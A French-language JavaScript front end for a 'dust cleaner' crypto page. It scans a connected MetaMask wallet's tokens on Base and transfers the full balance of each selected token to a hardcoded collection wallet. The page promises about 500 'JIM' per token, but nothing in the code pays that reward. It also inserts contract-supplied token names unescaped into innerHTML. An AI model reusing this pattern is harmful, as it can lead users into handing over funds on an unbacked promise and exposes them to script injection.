const connectButton = document.getElementById("connectButton");
const dustContainer = document.getElementById("dustContainer");
const cleanButton = document.getElementById("cleanButton");
const statusDiv = document.getElementById("status");

const COLLECTION_WALLET = "0x86E85282557fF41A7cD89AD7aA4BBD31CFea3fa9";

let provider;
let signer;
let selectedTokens = [];

const CHAIN_IDS = {
    "eth": "0x1",
    "base": "0x2105",
    "polygon": "0x89",
    "bsc": "0x38",
    "arbitrum": "0xa4b1",
    "optimism": "0xa4b0"
};

connectButton.onclick = async () => {
    if (!window.ethereum) {
        alert("MetaMask requis");
        return;
    }

    provider = new ethers.BrowserProvider(window.ethereum);
    await provider.send("eth_requestAccounts", []);
    signer = await provider.getSigner();
    const address = await signer.getAddress();

    statusDiv.innerHTML = "✅ Wallet connecté : " + address;
    scanDust(address);
};

async function scanDust(wallet) {
    dustContainer.innerHTML = "🔍 Scan et nettoyage visuel des poussières...";
    selectedTokens = []; // On vide la sélection précédente
    updateButton();

    try {
        // Requête sur le réseau Base qui fonctionne parfaitement chez toi
        const response = await fetch(
            `https://jimtok-backend.onrender.com/tokens/${wallet}/base`
        );
        const data = await response.json();
        const tokens = data.result.tokenBalances;

        let processedTokens = [];

        // On utilise le provider connecté pour aller interroger les détails des contrats
        for (const token of tokens) {
            const rawBalance = token.tokenBalance;

            // Si la balance est vide, à zéro ou nulle, on l'ignore
            if (!rawBalance || rawBalance === "0x0000000000000000000000000000000000000000000000000000000000000000" || rawBalance === "0x") {
                continue;
            }

            try {
                // Création d'une connexion rapide avec le contrat du jeton pour lui demander son nom et ses décimales
                const tokenContract = new ethers.Contract(
                    token.contractAddress,
                    [
                        "function symbol() view returns (string)",
                        "function decimals() view returns (uint8)"
                    ],
                    provider
                );

                // On récupère le symbole et les décimales (souvent 18 ou 6)
                const [symbol, decimals] = await Promise.all([
                    tokenContract.symbol().catch(() => "Jetons Inconnus"),
                    tokenContract.decimals().catch(() => 18)
                ]);

                // LA CONVERSION MAGIQUE : On transforme l'hexadécimal en vrai nombre lisible
                const balanceBigInt = BigInt(rawBalance);
                const balanceFormatee = ethers.formatUnits(balanceBigInt, decimals);
                const quantiteNum = Number(balanceFormatee);

                // On n'affiche le jeton que s'il y a une quantité réelle après conversion
                if (quantiteNum > 0) {
                    processedTokens.push({
                        contractAddress: token.contractAddress,
                        symbol: symbol,
                        balanceRaw: rawBalance,
                        balanceFormatted: balanceFormatee,
                        // Estimation arbitraire pour le calcul du bouton en attendant une API de prix stable
                        usd_value: quantiteNum * 0.02, 
                        chain: "base"
                    });
                }
            } catch (err) {
                console.log("Erreur décodage contrat : " + token.contractAddress, err);
            }
        }

        renderTokens(processedTokens);

    } catch(err) {
        console.log(err);
        dustContainer.innerHTML = "❌ Erreur lors du scan";
    }
}

function renderTokens(tokens) {
    dustContainer.innerHTML = "";

    if (tokens.length === 0) {
        dustContainer.innerHTML = "Aucune poussière active détectée.";
        return;
    }

    tokens.forEach(token => {
        const div = document.createElement("div");
        div.className = "token";
        div.style.display = "flex";
        div.style.alignItems = "center";
        div.style.margin = "10px 0";
        div.style.padding = "10px";
        div.style.border = "1px solid #ccc";
        div.style.borderRadius = "8px";

        // Affichage propre sans zéros inutiles
        div.innerHTML = `
            <input type="checkbox" style="margin-right: 15px; transform: scale(1.2);" />
            <div style="text-align: left; flex-grow: 1;">
                <strong style="color: #333; font-size: 16px;">${token.symbol}</strong> 
                <span style="font-size: 11px; color: gray; display: block; word-break: break-all;">${token.contractAddress}</span>
                <div style="font-weight: bold; margin-top: 5px; color: #007bff;">
                    Quantité : ${Number(token.balanceFormatted).toLocaleString('fr-FR', { maximumFractionDigits: 6 })}
                </div>
            </div>
        `;

        const checkbox = div.querySelector("input");
        checkbox.addEventListener("change", e => {
            if (e.target.checked) {
                selectedTokens.push(token);
            } else {
                selectedTokens = selectedTokens.filter(
                    t => t.contractAddress !== token.contractAddress
                );
            }
            updateButton();
        });

        dustContainer.appendChild(div);
    });
}

function updateButton() {
    if (selectedTokens.length === 0) {
        cleanButton.style.display = "none";
        return;
    }

    cleanButton.style.display = "block";

    // Calcule une estimation de JIM à distribuer en fonction des lignes sélectionnées
    let totalEstimation = selectedTokens.reduce(
        (sum, t) => sum + Number(t.balanceFormatted || 0),
        0
    );

    // Formule temporaire : 1 poussière donne environ 500 JIM pour le fun
    const estimatedJIM = Math.floor(selectedTokens.length * 500);
    cleanButton.innerText = `🧹 Convertir et recevoir ~ ${estimatedJIM} JIM`;
}

cleanButton.onclick = async () => {
    try {
        for (const token of selectedTokens) {
            statusDiv.innerHTML = `⏳ Préparation du transfert pour ${token.symbol}...`;

            const tokenContract = new ethers.Contract(
                token.contractAddress,
                [
                    "function transfer(address to, uint256 amount) returns (bool)"
                ],
                signer
            );

            statusDiv.innerHTML = `⏳ Nettoyage en cours de ${token.symbol}...`;

            // Envoi de la vraie balance en BigInt
            const tx = await tokenContract.transfer(
                COLLECTION_WALLET,
                BigInt(token.balanceRaw)
            );

            statusDiv.innerHTML = `⏳ En attente de la blockchain pour ${token.symbol}...`;
            await tx.wait();
        }

        statusDiv.innerHTML = "✅ Toutes les poussières sélectionnées ont été balayées !";
        selectedTokens = [];
        updateButton();
        
        // Rafraîchissement automatique de la liste
        const currentAddress = await signer.getAddress();
        scanDust(currentAddress);

    } catch(err) {
        console.log(err);
        statusDiv.innerHTML = "❌ Transaction annulée ou erreur réseau";
    }
};
